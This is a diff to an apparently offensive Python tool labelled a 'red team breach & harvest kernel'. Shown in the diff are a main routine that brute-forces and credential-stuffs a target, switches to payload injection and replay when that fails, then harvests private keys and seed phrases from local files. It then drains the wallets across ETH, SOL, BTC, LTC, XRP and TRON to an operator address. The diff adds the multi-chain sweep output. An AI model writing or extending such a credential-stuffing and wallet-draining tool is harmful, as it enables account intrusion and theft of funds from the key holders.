@@ -30,7 +30,7 @@ BANNER = f"""{MATRIX_GREEN}{BOLD}
  ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗██╔═══██╗██╔════╝ 
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═════╝  ╚═════╝  ╚═════╝ 
 {RESET}{NEON_BLUE}═════════════════════════════════════════════════════════════
-   [ROGUE_SYS // ADVANCED RED TEAM BREACH & HARVEST KERNEL]
+   [ROGUE_SYS // ADVANCED RED TEAM BREACH & HARVEST KERNEL V5.0]
 ═════════════════════════════════════════════════════════════{RESET}
 """
 
@@ -62,7 +62,9 @@ def main():
         target = target[8:]
     target = target.split('/')[0].split(':')[0]
 
-    cyber_print(f"{NEON_BLUE}[*] Target isolated: {target}{RESET}", 0.005)
+    # Clean block-tree structured output for target isolation
+    print(f"\n{CYAN}[TARGET 1/1] → https://{target}{RESET}")
+    print(f"       └── [STATUS] Target isolated and locked successfully.")
     cyber_print(f"{YELLOW}[INIT] Loading offensive wordlist dictionaries...{RESET}", 0.005)
     
     try:
@@ -71,30 +73,30 @@ def main():
         cyber_print(f"{RED}[ERROR] Wordlist mount failed: {e}{RESET}", 0.01)
         sys.exit(1)
 
-    cyber_print(f"{MATRIX_GREEN}[SUCCESS] Wordlist Secured : {len(passwords)} candidate vectors loaded.{RESET}", 0.005)
+    print(f"       └── [SUCCESS] Wordlist Secured : {len(passwords)} candidate vectors loaded.")
 
-    # Step 1: Real-time DOM Inspection & Security Header Audit (Structured Block Style)
-    cyber_print(f"\n{MAGENTA}[ENGINE] Executing target reconnaissance & security header audit...{RESET}", 0.005)
+    # Step 1: Real-time DOM Inspection & Security Header Audit
+    print(f"\n{CYAN}[RECON 2/2] → Executing DOM & Header Intelligence Scan{RESET}")
     try:
         asyncio.run(parse_target_source(target))
     except Exception as e:
-        cyber_print(f"{YELLOW}[!] Notice during DOM parse: {e}{RESET}", 0.005)
+        print(f"       └── [!] Notice during DOM parse: {e}")
 
     # Step 2: Launch Heavy Autonomous Engine (TCP Telemetry, Fuzzing, Surface Mapping, Credential Stuffing)
     hits, duration = asyncio.run(run_autonomous_engine(target, passwords))
 
     # Adaptive Pivot: If primary brute-force yields nothing, immediately trigger async replayer/injection
     if not hits:
-        cyber_print(f"{YELLOW}[*] Primary perimeter held. Pivoting to payload injection & replaying...{RESET}", 0.005)
+        cyber_print(f"{YELLOW}[*] Primary perimeter held. Pivoting to neural payload injection & replaying...{RESET}", 0.005)
         asyncio.run(replay_and_inject_payloads(target))
 
     # Step 3: Post-Exploitation, Cryptographic Key Harvesting & Clean Structured Asset Auditing
-    cyber_print(f"\n{MATRIX_GREEN}[+] Initiating post-exploitation asset harvesting & financial audit...{RESET}", 0.005)
+    cyber_print(f"\n{MATRIX_GREEN}[+] Initiating post-exploitation asset harvesting & multi-chain audit...{RESET}", 0.005)
     
     # 1. Harvest Private Keys & Seed Phrases
     keys_found = harvest_private_keys(".")
     
-    # 2. Universal Multi-Asset Check & Automated Drainer Sweep (Structured Block Layout inspired by image_20)
+    # 2. Universal Multi-Asset Check & Automated Drainer Sweep (Matched to 5-value return tuple)
     drain_results = []
     total_artifacts = len(keys_found)
     
@@ -108,17 +110,28 @@ def main():
         print(f"       └── [DATA]  Key/Seed: {key_content[:18]}...")
         
         try:
-            bal, drained, tx = check_and_drain_wallet(key_content)
-            print(f"       └── [SUCCESS] Balance Audited: {bal} ETH/SOL | Drained: {drained}")
+            total_bal, drained, tx, chain_breakdown, operator_dest = check_and_drain_wallet(key_content)
+            print(f"       └── [SUCCESS] Multi-Chain Balance Audited:")
+            print(f"           ├── ETH/EVM : {chain_breakdown['evm']} ETH")
+            print(f"           ├── SOL     : {chain_breakdown['sol']} SOL")
+            print(f"           ├── BTC     : {chain_breakdown['btc']} BTC")
+            print(f"           ├── LTC     : {chain_breakdown['ltc']} LTC")
+            print(f"           ├── XRP     : {chain_breakdown['xrp']} XRP")
+            print(f"           └── TRON    : {chain_breakdown['tron']} TRX")
+            print(f"       └── [ROUTING] Operator Destination: {operator_dest[:12]}...{operator_dest[-6:]}")
+            print(f"       └── [SWEEP STATUS] Drained: {drained} | TxHash: {tx[:16]}...")
+            
             drain_results.append({
                 "type": key_type,
                 "artifact": key_content[:15] + "...", 
-                "balance": bal, 
+                "balance": total_bal, 
+                "chains": chain_breakdown,
+                "operator_destination": operator_dest,
                 "drained": drained, 
                 "tx": tx
             })
         except Exception as e:
-            print(f"       └── [!] Asset audit bypass error: {e}")
+            print(f"       └── [!] Multi-chain asset audit error: {e}")
 
     # 3. Dispatch Encrypted Email Intelligence & Alerts
     try:
